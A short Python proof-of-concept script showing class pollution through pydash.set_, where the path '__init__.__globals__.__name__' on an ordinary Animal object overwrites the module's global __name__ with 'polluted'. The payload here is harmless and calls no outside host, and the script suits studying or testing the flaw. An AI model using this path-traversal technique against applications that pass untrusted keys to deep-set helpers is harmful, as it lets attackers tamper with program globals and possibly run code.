import  pydash 
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj1 = Animal('cat', 11)
obj2 = {'__init__.__globals__["__name__"]': "foo"}

merged = pydash.set_(obj1, '__init__.__globals__.__name__', "polluted")

print(__name__)